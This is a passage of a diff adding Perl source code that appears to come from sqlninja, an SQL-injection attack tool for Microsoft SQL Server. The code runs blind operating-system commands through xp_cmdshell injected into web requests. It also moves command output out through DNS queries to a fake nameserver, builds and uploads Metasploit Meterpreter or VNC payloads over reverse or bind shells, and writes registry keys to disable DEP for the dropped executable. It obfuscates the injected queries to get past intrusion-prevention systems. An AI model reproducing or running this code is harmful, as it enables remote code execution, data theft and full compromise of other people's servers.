+	Net::Pcap::compile(
+		$pcap,
+		\$filter,
+		$filterstring,
+		0,
+		$netmask
+	) && die 'Unable to compile packet capture filter';
+	Net::Pcap::setfilter($pcap, $filter) &&
+	    die 'Unable to set packet capture filter';
+
+	my $offset = linkoffset($pcap);
+	my $globref = [$offset,$ninjasock];
+	if ($verbose == 1) {
+		print "  [v] Stripping ".$offset." bytes for datalink header\n";
+	}
+	if ($proto eq "udp") {
+		Net::Pcap::loop($pcap,-1,\&dmpudp,$globref);
+	} else {
+		Net::Pcap::loop($pcap,-1,\&dmptcp,$globref);
+	}
+}
+
+# callback function for analyzing incoming tcp packets
+sub dmptcp 
+{
+	my ($globref,$header,$packet) = @_;
+	my ($offset,$ninjasock) = @{$globref};
+	my $ip_packet = substr($packet,$offset);
+	my $ip = NetPacket::IP->decode($ip_packet);
+	my $tcp = NetPacket::TCP->decode($ip->{'data'});
+	my $port = $tcp->{'dest_port'};
+	my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
+				      Type     => SOCK_DGRAM,
+				      Timeout  => 10);
+	$s->send($port);
+	close $s;
+}
+
+# callback function for analyzing incoming udp packets
+sub dmpudp 
+{
+	my ($globref,$header,$packet) = @_;
+	my ($offset,$ninjasock) = @{$globref};
+	my $ip_packet = substr($packet,$offset);
+	my $ip = NetPacket::IP->decode($ip_packet);
+	my $udp = NetPacket::UDP->decode($ip->{'data'});
+	my $port = $udp->{'dest_port'};
+	my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
+	                              Type     => SOCK_DGRAM,
+				      Timeout  => 10);
+	$s->send($port);
+	close $s;
+}
+
+# Checks that ports indicated for backscan module respect the netcat syntax
+# Return 0 if correct. 1 Otherwise
+sub checkports() 
+{
+	my $ports = $_[0];
+	my @portarray;
+	my $p;
+	# Check that only digits, hyphens and whitespaces are entered
+	if ($ports !~ m/^[\d\-\s]+$/) {
+		return 1;
+	}
+	@portarray = split(/ /,$ports);
+	foreach $p (@portarray) {
+		# Single port ?
+		if ($p =~ m/^(\d+)$/) {
+			if (($1 > 0) and ($1 < 65536)) {
+				next;
+			} else {
+				return 1;
+			}
+		}
+		# Port range ?
+		elsif ($p =~ m/^(\d+)-(\d+)$/) {
+			if (($1 > 0) and ($2 < 65536) and ($1 <= $2)) {
+				next;
+			} else {
+				return 1;
+			}
+		}
+		# None of the above... wrong 
+		return 1;
+
+	}
+	return 0;
+}
+
+# Generate a random filename to use for UNIX sockets
+# A fixed filename causes problems when a spurious file was left
+# from a previous execution that exited uncleanly and the file can't 
+# be unlink()-ed by the current user
+sub genfile
+{
+	my $rnd = int(rand()*65535);
+	my $filename = "/tmp/.ninjasocket_".$rnd;
+	return $filename;
+}
+
+
+# Attempt to tunnelize command output in DNS queries
+# URL-encode the command, then call dnssend() 
+# dnstunnel.exe must have been uploaded first
+sub dnstunnel
+{
+	print "[+] Starting dnstunnel mode...\n";
+	if ($verbose == 1) {
+		print "  [v] Be sure you uploaded dnstunnel.exe already\n";
+	}
+	print "[+] Use \"exit\" to be dropped back to your shell.\n";
+	my $cmd;
+	while (1) {
+		print "dnstunnel> ";
+		$cmd = <STDIN>;
+		chomp($cmd);
+		if ($cmd eq "exit") {
+			print "Thank you for using sqlninja... see ya\n";
+			exit(0);
+		}
+		if ($cmd ne "") {
+			dnssend($cmd);
+		}
+	}
+}
+
+# Sends the command to dnstunnel.exe and waits for the results
+sub dnssend
+{
+	my $cmd = $_[0];
+	my $requestpid; # pid of the web request
+	my $decoderpid; # pid of the message decoder
+	my $dnspid;     # pid of the fake DNS server
+	my $timeoutpid; # pid of the timeout process
+	unlink $dnssock;
+	
+	# Create the server socket that will receive messages from children
+	my $ninjasock;
+	$ninjasock=genfile();
+	unlink $ninjasock;
+	if ($verbose == 1) {
+		print "  [v] Starting local UNIX socket\n";
+	}
+	my $server = new IO::Socket::UNIX->new(Local => $ninjasock,
+					       Type  => SOCK_DGRAM,
+					       Listen=> 5)
+				|| die "can't create UNIX socket: $!\n";
+	my $msg; # message to the UNIX socket
+				
+	# spawn fake dns server
+	if ($verbose == 1) {
+		print "  [v] Starting dns server process\n";
+	}
+	$dnspid = fork();
+	if ($dnspid == -1) {
+		print "can't fork dns server process\n";
+		close $server;
+		unlink $ninjasock;
+		exit(1);
+	}
+	if ($dnspid == 0) {
+		$server->close;
+		dnsserver();
+		exit(0);
+	}
+	# spawn decoder process
+	if ($verbose == 1) {
+		print "  [v] Starting decoder process\n";
+	}
+	$decoderpid = fork();
+	if ($decoderpid == -1) {
+		print "can't fork decoder process\n";
+		close $server;
+		unlink $ninjasock;
+		unlink $dnssock;
+		exit(1);
+	}
+	if ($decoderpid == 0) {
+		$server->close;
+		decodedns($ninjasock);
+		exit(0);
+	}
+	# spawn the process for the web request
+	if ($verbose == 1) {
+		print "  [v] Starting web request process\n";
+	}
+	$requestpid = fork();
+	if ($requestpid == -1) {
+		print "can't fork web request process\n";
+		close $server;
+		unlink $ninjasock;
+		unlink $dnssock;
+		exit(1);
+	}
+	if ($requestpid == 0) {
+		$server->close;
+		dnstunnelrequest($cmd);
+		my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
+					      Type => SOCK_DGRAM,
+					      Timeout => 10);
+		$s->send("webdone");
+		close $s;	    
+		exit(0);
+	}
+
+	# Now wait for news....
+	$server->recv($msg,16,0);
+
+	# case 1: the decoder receives the full message and
+	# visualizes it. We kill the children and that's it
+	if ($msg eq "decoded") {
+		kill TERM => $requestpid;
+		kill TERM => $dnspid;
+		kill TERM => $decoderpid;
+		close $server;
+		unlink $ninjasock;
+		unlink $dnssock;
+		return;
+	}
+
+	# case 2: the web request returns but the decoder hasn't
+	# finished receiving the messages yet
+	# Since there is no other case, if we don't receive 
+	# "webdone" something is wrong
+	if ($msg ne "webdone") {
+		kill TERM => $dnspid;
+		kill TERM => $decoderpid;
+		close $server;
+		unlink $ninjasock;
+		unlink $dnssock;
+		print "Unexpected message: ".$msg.".... must be a bug\n";
+		exit(1);
+	}
+	
+	# spawn the timeout child, to wait for some more packets 
+	# to arrive
+	if ($verbose == 1) {
+		print "  [v] Web request finished... waiting for last packets\n";
+	}
+	$timeoutpid = fork();
+	if ($timeoutpid == -1) {
+		 print "can't fork timeout child !\n";
+		 kill TERM => $dnspid;
+		 kill TERM => $decoderpid;
+		 close $server;
+		 unlink $ninjasock;
+		 unlink $dnssock;
+		 exit(1);
+	}
+	if ($timeoutpid == 0) {
+		$server->close;
+		sleep(6);
+		my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
+					   Type => SOCK_DGRAM,
+					   Timeout => 10);
+		$s->send("timeout");
+		close $s;
+		exit(0);
+	}
+	
+	# Wait for more news
+	$server->recv($msg,16,0);
+
+	# case 1 again...
+	if ($msg eq "decoded") {
+		kill TERM => $timeoutpid;
+		kill TERM => $dnspid;
+		kill TERM => $decoderpid;
+		close $server;
+		unlink $ninjasock;
+		unlink $dnssock;
+		return;
+	}
+	
+	# case 2 again...
+	if ($msg ne "timeout") {
+		kill TERM => $dnspid;
+		kill TERM => $decoderpid;
+		close $server;
+		unlink $ninjasock;
+		unlink $dnssock;
+		print "Unexpected message.... must be a bug\n";
+		exit(1);
+	}
+
+	print "Some DNS packets seem to got lost.... try again\n";
+	
+	kill TERM => $dnspid;
+	kill TERM => $decoderpid;
+	close $server;
+	unlink $ninjasock;
+	unlink $dnssock;
+	return;
+}
+
+sub dnstunnelrequest
+{
+	my $cmd = "\%TEMP\%\\dnstun.exe ".$domain." ".$hostnamelen." ".$_[0];
+	if ($churrasco == 1) {
+		$cmd = usechurrasco($cmd);
+	}
+	my $command = createcommand($cmd);
+	my $result = sendrequest($command);
+}
+
+# Sniff dns requests and processes them
+sub dnsserver
+{
+	my $ns = Net::DNS::Nameserver->new(
+			LocalAddr	=> "0.0.0.0",
+			LocalPort    => 53,
+			ReplyHandler => \&reply_handler,
+			Verbose      => 0
+		) || die "could't create nameserver object\n";
+	$ns->main_loop;	
+}
+
+sub reply_handler
+{ 
+	my ($qname, $qclass, $qtype, $peerhost) = @_;
+	my ($rcode, @ans, @auth, @add);
+	if (($qtype ne "A") or ($qname !~ /$domain/)) {
+		return;
+	}
+	my ($ttl,$rdata) = (0,$resolvedip);
+	push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
+	$rcode = "NOERROR";
+	my $s = IO::Socket::UNIX->new(Peer => $dnssock,
+				      Type => SOCK_DGRAM,
+				      Timeout => 20);
+	$s->send($qname);
+	close $s;
+	return ($rcode, \@ans, \@auth, \@add, {aa => 1});
+}
+
+# Receives the dns messages from the sniffing child
+# and processes them
+sub decodedns
+{
+	my $ninjasock = $_[0];
+	my $msg;  # message from the DNS daemon
+	my @msgarray; # holds all received messages
+	my $buffer = ""; # buffer to decode
+	my $lastbuffered = -1; # last message appended to buffer
+	my $number; # number of current message
+	my $lastreceived = 0; # boolean: last packet received ?
+	my $complete = 0;     # boolean: all packets received ?
+	
+	my $chunklen; # length of chunk to decode
+	my $chunk; # chunk to decode
+	my $decoded; # decoded chunk`
+	my $n;
+	my $m; 
+	
+	my $server = IO::Socket::UNIX->new(Local => $dnssock,
+					   Type  => SOCK_DGRAM,
+					   Listen=> 10)
+			|| die "can't create UNIX socket: $!\n";
+	# Let's start listening ! :)
+	while ($complete == 0) {
+		$server->recv($msg,255,0);
+		# cut the domain and the dots....
+		$msg =~ s/$domain//;
+		$msg =~ s/\.//g;
+
+		# If there is a "9", it's the last message
+		# Check dnstunnel.c for encoding details
+		if ($msg =~ /9/) {
+			($n,$m) = split(/9/,$msg);
+			$lastreceived = 1;
+		} else {
+			($n,$m) = split(/8/,$msg);
+		}
+
+		# Insert the received message in the array
+		$number=base32counterdecode($n);
+		$msgarray[$number]=$m;
+		# If the received message is exactly the same
+		# that we were waiting for, append it to the buffer,
+		# followed by other ones previously received in wrong 
+		# order, if any
+		my $arraylen = @msgarray;
+		while (($msgarray[$number] ne "") and ($number<$arraylen)) {
+			if ($number == ($lastbuffered+1)) {
+				$buffer .= $msgarray[$number];
+				$lastbuffered = $lastbuffered+1;
+			}
+				$number++;
+		}
+		
+		# decode what can be decoded in the buffer and print
+		$chunklen = (int(length($buffer)/8))*8;
+		$chunk = substr($buffer,0,$chunklen);
+		$buffer = substr($buffer,$chunklen);
+		$decoded = base32decode($chunk);
+		print $decoded;
+		
+		# Are we at the end ?
+		$complete=checkdnscomplete(\@msgarray,$lastreceived);	
+	}
+	
+	$decoded = base32decode($buffer);
+	print $decoded;
+	my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
+				      Type => SOCK_DGRAM,
+				      Timeout => 10)
+			||  die "can't create UNIX socket: $!\n";
+	$s->send("decoded");
+	close $s;
+	exit(0);
+}
+
+# Check whether all messages have been received
+sub checkdnscomplete
+{
+	my @msgarray=@{$_[0]};
+	if ($_[1] == 0) {
+		return 0;
+	}
+	my $number = @msgarray;
+	my $i;
+	my $complete = 1;
+	if ($_[1] == 1) {
+		for ($i=0;$i<$number;$i++) {
+			if ($msgarray[$i] eq '') {
+				$complete=0;
+			}
+		}
+	}
+	return $complete;
+}
+
+# decode a base32-encoded string
+# Outrageously ripped from Convert-Base-32 by Tatsuhiko Miyagawa
+sub base32decode
+{
+	my $encoded = $_[0];
+	lc($encoded); # shouldn't be necessary... but just to be sure
+	my %char2bits = qw@
+		a 00000
+		b 00001
+		c 00010
+		d 00011
+		e 00100
+		f 00101
+		g 00110
+		h 00111
+		i 01000
+		j 01001
+		k 01010
+		l 01011
+		m 01100
+		n 01101
+		o 01110
+		p 01111
+		q 10000
+		r 10001
+		s 10010
+		t 10011
+		u 10100
+		v 10101
+		w 10110
+		x 10111
+		y 11000
+		z 11001
+		0 11010
+		1 11011
+		2 11100
+		3 11101
+		4 11110
+		5 11111
+	@;
+	my $buffer = '';
+	for my $pos (0..length($encoded)-1) {
+		$buffer .= $char2bits{substr($encoded,$pos,1)};
+	}
+	return pack('B*',$buffer);
+}
+
+# decode a base32-encoded counter
+sub base32counterdecode
+{
+	my $encoded = $_[0];
+	my %char2number = qw@
+		a 0
+		b 1
+		c 2
+		d 3
+		e 4
+		f 5
+		g 6
+		h 7
+		i 8
+		j 9
+		k 10
+		l 11
+		m 12
+		n 13
+		o 14
+		p 15
+		q 16
+		r 17
+		s 18
+		t 19
+		u 20
+		v 21
+		w 22
+		x 23
+		y 24
+		z 25
+		0 26
+		1 27
+		2 28
+		3 29
+		4 30
+		5 31
+	@;
+	my $number;
+	my $i;
+	my $len = length($encoded);
+	for my $pos (0..$len-1) {
+		$i = $char2number{substr($encoded,$pos,1)};
+		$number += $i*(32 ** ($len-1-$pos));
+	}
+	return $number;
+}
+		
+
+# Launches "blind" commands using xp_cmdshell through the web application
+sub sqlcmd
+{
+	print "[+] Starting blind command mode.";
+	print " Use \"exit\" to be dropped back to your shell.\n";
+	my $cmd;
+	my $command;
+	my $result;
+	while (1) {
+		print "> ";
+		$cmd = <STDIN>;
+		chomp($cmd);
+		if ($churrasco == 1) {
+			$cmd = usechurrasco($cmd);
+		}
+		if ($cmd eq "exit") {
+			print "Thank you for using sqlninja... see ya\n";
+			exit(0);
+		}
+		if ($cmd ne "") {
+			$command = createcommand($cmd);
+        		$result = sendrequest($command);
+			print "[+] Command has been sent and executed\n";
+		}
+	}
+}
+
+# Use the metasploit framework to create a payload, upload it and execute it
+# Of course, you need metasploit3 in your path
+# And kudos to the whole Metasploit team
+sub metasploit
+{
+	print "[+] Entering Metasploit module. In order to use this module ".
+	   "you need to\n    have found an available TCP port, either ".
+	   "inbound or outbound\n";
+	# We start checking whether Metasploit is there...
+	print "[+] Checking Metasploit3 availability....\n";
+	my $msfcli = "";
+	my $msfpayload = "";
+	my $msfencode = "";
+	if ($msfpath eq "") {
+		my $path1 = $ENV{PATH};
+		my @path = split(/:/,$path1);
+		foreach (@path) {
+			if (-e $_."/msfcli") {
+				$msfcli = $_."/msfcli";
+			} elsif (-e $_."/msfcli3") {
+				$msfcli = $_."/msfcli3";
+			}
+			if (-e $_."/msfpayload") {
+				$msfpayload = $_."/msfpayload";
+			} elsif (-e $_."/msfpayload3") {
+				$msfpayload = $_."/msfpayload3";
+			}
+			if (-e $_."/msfencode") {
+				$msfencode = $_."/msfencode";
+			} elsif (-e $_."/msfencode3") {
+				$msfencode = $_."/mfsencode3";
+			}
+		}
+	} else {
+		if ($msfpath != m/\/$/) { # add a final slash, if needed
+			$msfpath .= "/";
+		}
+		if (-e $msfpath."msfcli") {
+			$msfcli = $msfpath."msfcli";
+		} elsif (-e $msfpath."msfcli3") {
+			$msfcli = $msfpath."msfcli3";
+		}
+		if (-e $msfpath."msfpayload") {
+			$msfpayload = $msfpath."msfpayload";
+		} elsif (-e $msfpath."msfpayload3") {
+			$msfpayload = $msfpath."msfpayload3";
+		}
+		if (-e $msfpath."msfencode") {
+			$msfencode = $msfpath."msfencode";
+		} elsif (-e $msfpath."msfencode3") {
+			$msfencode = $msfpath."msfencode3";
+		}
+	}
+	if ($msfcli eq "") {
+		print "[-] msfcli not found\n";
+		exit(-1);
+	}
+	if ($msfpayload eq "") {
+		print "[-] msfpayload not found\n";
+		exit(-1);
+	}
+	if (($msfencode eq "") and ($msfencoder ne "")) {
+		print "[-] msfencode not found\n";
+		exit(-1);
+	}
+	print "[+] Which payload you want to use?\n";
+	print "    1: Meterpreter\n    2: VNC\n";
+	my $payload;
+	while (($payload != 1) and ($payload != 2)) {
+		print "> ";
+		$payload = <STDIN>;
+		chomp($payload);
+	}
+	if ($payload == 1) {
+		$payload = "meterpreter";
+	} else {
+		$payload = "vncinject";
+	}
+	print "[+] Which type of connection you want to use?\n";
+	print "    1: bind_tcp\n    2: reverse_tcp\n";
+	my $conn;
+	while (($conn ne "1") and ($conn ne "2")) {
+		print "> ";
+		$conn = <STDIN>;
+		chomp($conn);
+	}
+	if ($conn == 1) {
+		$conn = "bind_tcp";
+	} else {
+		$conn = "reverse_tcp";
+	}
+	my $host2;
+	if ($conn eq "bind_tcp") {
+		print "[+] Enter remote host [".$host."]\n> ";
+		$host2 = <STDIN>;
+		chomp $host2;
+		if ($host2 eq "") {
+			$host2 = $host;
+		}
+	}
+	if ($conn eq "bind_tcp") {
+		print "[+] Enter remote port number\n";
+	} else {
+		print "[+] Enter local port number\n";
+	}
+	my $port = 0;
+	while (($port < 1) or ($port > 65535)) {
+		print "> ";
+		$port = <STDIN>;
+		chomp($port);
+	}
+
+	# ok... let's start the fun
+	# We start creating the payload executable
+	# We use a random name, because using the same name twice would
+	# create problems if the first executable is still running
+	my $exe = "met".int(rand()*65535);
+	my $command = $msfpayload." windows/".$payload."/".$conn.
+		" exitfunc=process lport=".$port." ";
+	if ($conn ne "bind_tcp") {
+		$command .= " lhost=".$lhost." ";
+	}
+	if ($msfencoder eq "") {
+		$command .= " X > /tmp/".$exe.".exe";
+	} else {
+		$command .= " R | ".$msfencode.
+			    " -e ".$msfencoder.
+			    " -c ".$msfencodecount.
+			    " -t exe".
+			    " -o /tmp/".$exe.".exe";
+	}
+	if ($verbose == 1) {
+		print "[v] Command: ".$command."\n";
+	}
+	print "[+] Calling msfpayload3 to create the payload...\n";
+	system ($command);
+	unless (-e "/tmp/".$exe.".exe") {
+		print "[-] Payload creation failed\n";
+		exit(-1);
+	}
+	print "[+] Payload (".$exe.".exe) created. Now uploading it\n";
+	upload("/tmp/".$exe.".exe");
+	system ("rm /tmp/".$exe.".exe");
+
+	my $cmd;
+	if ($checkdep eq "yes") {
+		# We might have to disable DEP for met.exe
+		print "[+] Checking if DEP (Data Execution Prevention) ".
+	       		"is enabled on target\n";
+		$cmd = "declare \@a nvarchar(999) ".
+	       		"EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',".
+	       		"'SYSTEM\\CurrentControlSet\\Control',".
+	       		"'SystemStartOptions',\@a OUTPUT ".
+	       		"if \@a like '%NOEXECUTE%' waitfor delay '0:0:"
+						.$blindtime."'";
+		my $result = tryblind($cmd);
+		if ($result > ($blindtime - 2)) {
+			handledep($exe);
+		} else {
+			print "[+] No DEP detected.... good\n";
+		}
+	}
+	
+	# A couple of variables to handle some delays, depending on
+	# who starts the connection
+	my $delaycli = 0;
+	my $delaydb = 0;
+	if ($conn eq "bind_tcp") {
+		$delaycli = 5;
+	} else {
+		$delaydb = 5;
+	}
+	# The child handles the request to the target, the parent
+	# calls Metasploit
+	my $pid = fork();
+	if ($pid == 0) {
+		# Launch met.exe 
+		sleep($delaydb);
+		$cmd = "%TEMP%\\".$exe.".exe";
+		if ($churrasco == 1) {
+			$cmd = usechurrasco($cmd);
+		}
+		$command = createcommand($cmd);
+		sendrequest($command);
+		exit(0);
+	}
+	# This is the parent
+	sleep($delaycli);
+	my $syscommand = $msfcli." multi/handler ".
+	              "payload=windows/".$payload."/".$conn." ";
+	if ($conn eq "bind_tcp") {
+		$syscommand .= "lport=".$port." rhost=".$host2." E";
+	} else {
+		$syscommand .= "lport=".$port." lhost=".$lhost." E";
+	}
+	if ($verbose == 1) {
+		print "[v] Execuring: ".$syscommand."\n";
+	}
+	print "[+] Transferring control to msfcli. Have fun!\n\n";
+	system($syscommand);
+}
+
+# Wrap $cmd with churrasco.exe
+sub usechurrasco
+{
+	return "%TEMP%\\churrasco.exe \"".$_[0]."\"";
+}
+
+# Windows Server 2003 SP1+ has DEP enabled.... we need to take care of this
+sub handledep
+{
+	my $exe = $_[0];
+	my $dep;
+	my $cmd;
+	my $result;
+
+	# This is the generic query to check what configuration is in place
+	my $depquery1 = "declare \@a nvarchar(100) ".
+			"EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',".
+			"'SYSTEM\\CurrentControlSet\\Control',".
+			"'SystemStartOptions',\@a OUTPUT ".
+			"if \@a like '%";
+	my $depquery2 = "%' waitfor delay '0:0:".$blindtime."'";
+
+	# We start with "OptOut", which should be the default
+	$cmd = $depquery1."OPTOUT".$depquery2;
+	$result = tryblind($cmd);
+	if ($result > ($blindtime - 2)) {
+		$dep = "OptOut";
+	}
+	if ($dep eq "") {
+		$cmd = $depquery1."OPTIN".$depquery2;
+		$result = tryblind($cmd);
+		if ($result > ($blindtime - 2)) {
+			$dep = "OptIn";
+		}
+	}
+	if ($dep eq "") {
+		$cmd = $depquery1."ALWAYSON".$depquery2;
+		$result = tryblind($cmd);
+		if ($result > ($blindtime - 2)) {
+			$dep = "AlwaysOn";
+		} else {
+			$dep = "AlwaysOff";
+		}
+	}
+	if (($dep eq "OptIn") or ($dep eq "AlwaysOff")) {
+		print "[+] DEP is marked as ".$dep.". We should be fine\n";
+		return;
+	} elsif ($dep eq "AlwaysOn") {
+		print "[-] DEP is marked as AlwaysOn... \n".
+		      "[-] Will try my best but don't count on it too much\n";
+	} else {
+		print "[+] DEP is marked as OptOut...trying to disable it\n";
+	}
+
+	# Whitelist our executable
+	# $cmd = "exec xp_regdeletekey 'HKEY_LOCAL_MACHINE','Software\\".
+	#   "Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers'";
+	#sendrequest($cmd);
+
+	my $table = "##ice".int(rand()*9999);
+	$cmd = "declare \@b nvarchar(999) ".
+	  "create table ".$table." (a nvarchar(999)) ". 
+	  "insert into ".$table." exec master..".$xp_name." 'echo %TEMP%' ".
+	  "set \@b = (select top 1 * from ".$table.")+'\\".$exe.".exe' ".
+	  "exec master..xp_regwrite 'HKEY_LOCAL_MACHINE',".
+	  "'Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers',".
+	  "\@b,'REG_SZ','DisableNXShowUI' ".
+	  "drop table ".$table;
+	 sendrequest($cmd);
+	# God bless xp_regread and xp_regwrite... 
+	# Two authentic backdoors by design
+}
+
+sub createcommand
+{
+	my $cmd = $_[0];
+	$cmd =~ s/'/''/g;
+	my $command;
+	$cmd = "cmd /C ".$cmd;
+	# a) sysadmin privileges, native or with sp_addsrvrolemember.
+	# If so, we have for sure xp_cmdshell (either native or custom)
+	if ($password eq "") {
+		$command = "exec master..".$xp_name." '".$cmd."';";
+	}
+	# b) we have the password, we have a xp_cmdshell, but the call to
+	# sp_addsrvrolemember is not yet effective (damn ODBC connection
+	# pool!). Therefore, we have to use openrowset at each call
+	elsif ($xp_name ne "NULL") {
+		# $password =~ s/ /%20/g;
+		$cmd =~ s/'/''/g;
+		$command = "select * from OPENROWSET('SQLOLEDB','';'sa';'".
+			   $password."','select 1;exec master..".$xp_name.
+			   " ''".$cmd."''');";
+	}
+	# c) we have the password, but no xp_cmdshell and sp_addsrvrolemember
+	# is not yet effective. CREATE PROCEDURE does not seem to work when 
+	# nested into OPENROWSET, so we have to use the custom_xp code each 
+	# time. 
+	# Complicated, slow, but it works
+	else {
+		# $password =~ s/ /%20/g;
+		$cmd =~ s/'/''/g;
+		$command = "select * from OPENROWSET('SQLOLEDB','';'sa';'".
+		      $password."','select 1;DECLARE \@ID int ".
+		      "EXEC sp_OACreate ''WScript.Shell'',\@ID OUT ".
+		      "EXEC sp_OAMethod \@ID,''Run'',Null,''".$cmd."'',0,1 ".
+		      "EXEC sp_OADestroy \@ID');";
+	}
+}
+
+# Converts a query to its hex string
+sub convert2hex
+{
+	my $s = $_[0];
+	$s =~ s/(.)/sprintf("%02lx", ord $1)/eg;
+	$s = "0x".$s;
+	return $s;
+}
+
+sub randomcase
+{
+	my $s1 = $_[0];
+	my $s2;
+	my @s = split(//,$s1);
+	foreach (@s) {
+		if ($_ =~ /\w/) {
+			if (int(rand(2))==1) {
+				$s2 = $s2.uc($_);
+			} else {
+				$s2 = $s2.lc($_);
+			}
+		} else {
+			$s2 = $s2.$_;
+		}
+	}
+	return $s2;
+}
+
+# Performs some magic on the query to inject, in order to confuse IPS's.
+# No, it's not necessarily an 'evil black hat' feature
+sub evadeips
+{
+	my $command = $_[0];
+	
+	# N.B.: Order is important
+	
+	# Transform the query to its hex representation and executes it
+	if ($evasion =~ /1/) {
+		my $hex = convert2hex($command);
+		$command = "declare \@a varchar(8000) ".
+			    "set \@a=".$hex." ".
+			    "exec (\@a)";
+	}
+
+	# Use comments as separator
+	if ($evasion =~ /2/) {
+		$command =~ s/[\t\r\n]/ /g;
+		$command =~ s/ /\/**\//g;
+	}
+	
+	# Random case
+	if ($evasion =~ /3/) {
+		$command = randomcase($command);
+	}
+
+	# ...random URL-encoding must be encapsulated in urlencode()
+	
+	return $command;
+}
+
+# Encode SQL commands into url-friendly strings
+# It also perform random URI encoding evasion
+sub urlencode
+{	
+	my $s = $_[0];
+	if ($verbose == 1) {
+		"  [v] URL-encoding command\n";
+	}
+	$s =~ s/[\t\r\n]/ /g;
+	
+	my @t = split(//,$s);
+	$s = "";
+	foreach (@t) {	
+		if (($evasion =~ /4/)          # If random URI encoding,
+		   and ($_ =~ /[A-Za-z0-9]/)   # and it's alphanumeric
+		   and (int(rand(3))==1)) {    # we might as well encode it :)
+			$_=sprintf("%%%2X", ord($_));
+		} else {
+			$_=~s/([^A-Za-z0-9])/sprintf("%%%2X", ord($1))/se;
+		}
+		$s=$s.$_;
+	}
+	return $s;
+}
+
+
+# Send the request to the web server and return the results
+sub sendrequest 
+{
+	my $command;
+
+	# Do we need to evade some IPS?
+	if ($evasion eq "0") {
+		$command = $_[0];
+	} else {
+		$command = evadeips($_[0]);
+	}
+	# DEBUG MODE 1
+        if (($debug eq "1") or ($debug eq "all")) {
+		print "++++++++++++++++SQL Command++++++++++++++++\n";
+		print $_[0]."\n";
+		print "-------------------------------------------\n";
+	}
+
+	if (($evasion ne "0") and (($debug eq "1") or ($debug eq "all"))) {
+		print "+++++++++Obfuscated SQL Command++++++++++++\n";
+		print $command."\n";
+		print "-------------------------------------------\n";
+	}
+
+	$command = urlencode($command);
+
+	# Create the socket for the communication
+	my $s; # The socket
+	# Create the correct socket depending on proxy and SSL
+	if (($ssl == 0) and ($proxyhost eq "")) {
+		$s = IO::Socket::INET->new
+		(
+			PeerAddr => $host,
+			PeerPort => $port,
+			Proto    => 'tcp',
+			Type     => SOCK_STREAM
+		);
+		if (!defined $s) {
+			print "\nError: could not create socket to ".$host.":"
+						.$port."\n";
+			exit(1);
+		}
+	} elsif (($ssl == 1) and ($proxyhost eq "")) {
+		$s = IO::Socket::SSL->new
+		(
+			PeerAddr => $host,
+			PeerPort => $port
+		);
+		if (!defined $s) {
+			print "\nError: could not create SSL socket to "
+						.$host.":".$port."\n";
+			exit(1);
+		}
+	} elsif (($ssl == 0) and ($proxyhost ne "")) {
+		$s = IO::Socket::INET->new
+		(
+			PeerAddr => $proxyhost,
+			PeerPort => $proxyport,
+			Proto	 => 'tcp',
+			Type	 => SOCK_STREAM
+		);
+		if (!defined $s) {
+			print "\nError: could not create socket to ".
+					$proxyhost.":".$proxyport."\n";
+		exit(1);
+		}
+	} else {
+		$s = IO::Socket::INET->new
+		(
+			PeerAddr => $proxyhost,
+			PeerPort => $proxyport,
+			Proto    => 'tcp',
+			Type     => SOCK_STREAM
+		);
+		if (!defined $s) {
+			print "\nError: could not create socket to ".
+                                     $proxyhost.":".$proxyport."\n";
+			exit(1);
+		}
+		                         "Host: ".$vhost."\r\n\r\n";
+		print $s "CONNECT ".$host.":".$port." HTTP/1.".$httpversion."\r\n".
+			 "Host: ".$vhost."\r\n\r\n";
+		my $proxyresp = <$s>;
+		# The following is causing *completely random* problems with
+		# my VMPlayer. Need to investigate
+		# if ($proxyresp !~ / 200 /) {
+		#	print "Proxy CONNECT failed: $proxyresp";
+		#	exit(1)
+	        #}
+		IO::Socket::SSL->start_SSL($s, SSL_startHandshake => 0);
+		$s->connect_SSL;
+		if (!defined $s) {
+			print "\nError: proxy SSL CONNECT to socket to ".
+				$host.":".$port." failed\n";
+			exit(1);
+		}
+	}
+	$s->autoflush(1);
+	my $finalstring;
+	# If there is a proxy, we need to add the host to the 
+	# first line of the request. We use $proxystring for this
+	my $proxystring = "";
+	if (($proxyhost ne "") and ($ssl == 0)) {
+		$proxystring = "http://".$host.":".$port;
+	}
+	# method: POST
+	if ($method eq "POST") {
+		my $postline = $stringstart.$command.$appendcomment.$stringend;
+		$finalstring = "POST ".$proxystring.$page." HTTP/1.".
+							$httpversion."\n".
+			"Host: ".$vhost."\n".
+			$headers.
+			"Content-Length: ".(length($postline))."\n".
+			"\n".
+			$postline."\n";
+	} 
+	# method: GET
+	else {
+		my $url = $page."?".$stringstart.$command.$appendcomment.
+			$stringend;
+		$finalstring = "GET ".$proxystring.$url." HTTP/1.".
+							$httpversion."\n".
+			"Host: ".$vhost."\n".
+			 $headers.
+			"\n";
+	}
+	$finalstring =~ s/\n/\r\n/g;
+	# DEBUG MODE 2
+	if (($debug eq "2") or ($debug eq "all")) {
+		print "+++++++++++++++HTTP Request++++++++++++++++\n";
+		print $finalstring;
+		print "-------------------------------------------\n";
+	}
+	print $s $finalstring;
+	# and here is the response from the server
+	my $line;
+	my $result = "";
+	my $errormsg = "    Check configuration, as things might not be ".
+					"working as expected !\n";
+
+	# Dirty hack to cope with broken proxies that do not
+	# care about the "Connection: close" header
+	while ((defined($line = <$s>)) and ($result !~ m/<\/html>/i)) {
+		$result .= $line;
+	}
+
+	# We have the result. Now some error checking...
+	# First we get rid of all \r\n's
+	$result =~ s/\r\n/\n/g;
+
+	# Then we split the result in different lines
+	my @lines = (split /\n/,$result);
+	
+	# If it is a POST requests, the web server will answer with "100
+	# Continue" first. We have to skip that part of response to check
+	# the actual response code. In order to do so, we have to look for
+	# the first empty line.
+	if ($lines[0] =~ m/100 Continue/) {
+		while ($lines[0] ne "") {
+		       		shift(@lines);
+		}
+		shift(@lines); # Shift the remaining empty line
+	}
+	
+	# Ok, unless something went wrong, we have the response code in the
+	# first line of the array
+	if (($lines[0] !~ m/200 OK/) and # not a 200 OK 
+	    ($errorflag == 0) and # no previous errors detected
